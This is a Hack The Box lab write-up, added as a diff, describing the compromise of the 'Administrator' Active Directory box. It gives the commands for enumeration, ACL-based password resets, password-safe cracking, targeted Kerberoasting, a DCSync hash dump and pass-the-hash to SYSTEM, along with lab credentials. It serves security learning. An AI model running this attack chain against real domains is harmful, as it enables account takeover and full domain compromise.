@@ -1,0 +1,150 @@
+# HTB Box: Administrator (10.129.251.186) - Walkthrough
+
+## Introduction
+
+This writeup documents my full exploitation of the "Administrator" box on Hack The Box. The goal was not speed, but depth—understanding each layer of the AD environment, abuse paths, and fallback scenarios. 
+This writeup includes both the successful attack paths and dead ends, in order to help others follow the same logic and avoid the same mistakes.
+
+## Objective
+
+To deeply understand and practice Active Directory attacks and privilege escalation techniques through a realistic HTB lab environment.
+The focus was on learning over speed, with the intent of mastering AD enumeration, abuse of ACLs, and domain compromise methods.
+
+## Narrative Overview
+
+This walkthrough describes my step-by-step process of compromising the "Administrator" box,
+documenting not just the successful paths but also dead ends and decisions that shaped the attack strategy.
+
+---
+
+## Initial Recon
+
+I started with a full TCP Nmap scan:
+nmap -p- --min-rate=1000 -T4 10.129.251.186 -oN full_scan.txt
+
+Then a service/version scan on open ports:
+nmap -sC -sV -p21,53,88,135,139,389,445,464,593,636,3268,3269 10.129.251.186 -oN service_scan.txt
+
+
+I identified common AD ports including SMB, Kerberos, LDAP, and WinRM. Anonymous SMB access was allowed, but enumeration was limited. Enum4linux revealed domain name `administrator.htb`.
+
+---
+
+## Gaining Access with Olivia
+
+Credentials `olivia:ichliebedich` were provided. I validated access via CrackMapExec:
+cme smb 10.129.251.186 -u olivia -p 'ichliebedich' --shares --users
+
+This confirmed that Olivia could authenticate and view SMB shares like NETLOGON and SYSVOL.
+
+---
+
+## BloodHound Enumeration
+
+Using BloodHound.py with Olivia:
+bloodhound.py -u olivia -p 'ichliebedich' -d administrator.htb -dc dc.administrator.htb -c All -ns 10.129.251.186 -k
+
+BloodHound revealed Olivia had **GenericAll** rights over `michael`, meaning I could reset his password.
+
+---
+
+## Privilege Escalation to Michael
+
+I used Evil-WinRM to reset Michael's password:
+evild-winrm -u olivia -p 'ichliebedich' -i 10.129.251.186
+net user michael Wachtw00rd! /domain
+
+Login as `michael` was successful via Evil-WinRM.
+
+---
+
+## From Michael to Benjamin
+
+BloodHound showed Michael had **ForceChangePassword** over `benjamin`.
+Using PowerView:
+Set-DomainUserPassword -Identity benjamin -AccountPassword (ConvertTo-SecureString 'P4sswordBen2025!' -AsPlainText -Force)
+
+Attempting to access Benjamin via Evil-WinRM failed:
+WinRMAuthorizationError
+
+Indicating Benjamin wasn't authorized for WinRM. I pivoted to **FTP**, which was open.
+
+ftp 10.129.251.186
+
+I successfully logged in with Benjamin’s credentials and retrieved `backup.psafe3`.
+
+---
+
+## Cracking the Password Safe
+
+I used Hashcat to brute-force the `.psafe3` file:
+hashcat -m 5200 -a 0 backup.psafe3 /usr/share/wordlists/rockyou.txt
+
+Recovered password: `tekieromucho`
+
+---
+
+## Credential Spray and Emily Access
+
+Extracted multiple user credentials from the backup file. Tried Evil-WinRM:
+evild-winrm -i 10.129.251.176 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+
+Failed due to incorrect IP.
+
+Corrected to:
+evil-winrm -i 10.129.251.186 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+
+Successfully logged in and found `user.txt`.
+
+---
+
+## Emily → Ethan via GenericWrite
+
+BloodHound showed **GenericWrite** from Emily to Ethan.
+With PowerView:
+Set-DomainObject -Identity ethan -Set @{'servicePrincipalName'='http/kerbopwned'}
+
+Dumped SPN hash:
+GetUserSPNs.py administrator.htb/emily:'...' -dc-ip 10.129.251.186 -request
+
+Cracked it:
+hashcat -m 13100 ethan_hash.txt /usr/share/wordlists/rockyou.txt
+# Password: limpbizkit
+
+---
+
+## Final Compromise via DCSync
+
+Ethan couldn’t log in via WinRM (same `WinRMAuthorizationError`), so I used:
+secretsdump.py administrator.htb/ethan:'limpbizkit'@10.129.251.186
+
+Recovered `Administrator` NTLM hash:
+3dc553ce4b9fd20bd016e098d2d2fd2e
+
+Used psexec to gain SYSTEM shell:
+psexec.py administrator.htb/Administrator@10.129.251.186 -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e
+
+Found `root.txt`.
+
+---
+
+## Summary
+
+This was a full AD attack chain:
+
+* Enum via SMB and RPC
+* Password reset via GenericAll
+* Forced password change
+* Pivot through FTP
+* SPN abuse and Kerberoasting
+* DCSync to dump Domain Admin hash
+
+Documenting failures (e.g. failed Evil-WinRM, wrong IPs, WinRM restrictions) was key to understanding fallback paths.
+
+This walkthrough is structured to help others not just replicate steps, but understand *why* each path was chosen.
+
+## Closing Notes
+
+This box demonstrates the critical importance of understanding AD object relationships and misconfigurations. A single misconfigured ACL can lead to full domain compromise. Tools are only as effective as your strategy — the real key is knowing which path to pursue, and when to change direction. If you're studying for a certification like eCPPTv3, mastering these chains will pay off.
+
+Happy hacking, and keep learning.
